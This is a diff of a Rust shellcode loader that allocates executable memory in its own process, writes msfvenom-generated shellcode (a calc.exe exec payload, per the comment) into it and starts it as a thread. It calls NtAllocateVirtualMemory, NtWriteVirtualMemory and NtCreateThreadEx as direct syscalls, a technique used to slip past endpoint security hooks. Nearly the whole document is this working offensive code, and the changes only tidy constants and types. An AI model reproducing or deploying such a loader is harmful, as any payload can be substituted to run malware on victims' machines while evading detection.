@@ -1,14 +1,17 @@
 use {
-    core::ffi::c_void,
-    winapi::{
-        shared::{
-            minwindef::FALSE,
-            ntdef::{HANDLE, NT_SUCCESS, NULL},
-        },
-        um::winnt::{MEM_COMMIT, MEM_RESERVE, PAGE_EXECUTE_READWRITE, THREAD_ALL_ACCESS}
+    syscall::syscall, 
+    winapi::um::winnt::{THREAD_ALL_ACCESS},
+    core::{
+        ptr::null_mut, u64,
+        ffi::c_void
     },
-    syscall::syscall,
 };
+
+#[inline]
+#[allow(non_snake_case)]
+pub fn NT_SUCCESS(status: i32) -> bool {
+    status >= 0
+}
 
 fn main() {
     // msfvenom -p windows/x64/exec CMD=calc.exe -f rust
@@ -34,20 +37,19 @@ fn main() {
         0x63, 0x2e, 0x65, 0x78, 0x65, 0x00,
     ];
 
-    let mut shellcode_size = shellcode.len();
-    let mut address = NULL;
-    let handle: u64 = 0xffffffffffffffff;
+    let mut size = shellcode.len();
+    let mut address = null_mut::<c_void>();
 
     unsafe {
         let mut status;
         status = syscall!(
             "NtAllocateVirtualMemory",
-            handle,
+            u64::MAX,
             &mut address,
             0,
-            &mut shellcode_size,
-            MEM_COMMIT | MEM_RESERVE,
-            PAGE_EXECUTE_READWRITE
+            &mut size,
+            0x3000,
+            0x40
         );
 
         if !NT_SUCCESS(status) {
@@ -56,31 +58,31 @@ fn main() {
 
         status = syscall!(
             "NtWriteVirtualMemory",
-            handle,
+            u64::MAX,
             address,
             shellcode.as_ptr() as *mut c_void,
             shellcode.len(),
-            NULL
+            null_mut::<c_void>()
         );
 
         if !NT_SUCCESS(status) {
             return;
         }
 
-        let mut thread_handle: HANDLE = NULL;
+        let mut h_thread = null_mut::<c_void>();
         status = syscall!(
             "NtCreateThreadEx",
-            &mut thread_handle,
+            &mut h_thread,
             THREAD_ALL_ACCESS,
-            NULL,
-            handle,
+            null_mut::<c_void>(),
+            u64::MAX,
             address,
-            NULL,
-            FALSE,
+            null_mut::<c_void>(),
             0_usize,
             0_usize,
             0_usize,
-            NULL
+            0_usize,
+            null_mut::<c_void>()
         );
 
         if !NT_SUCCESS(status) {
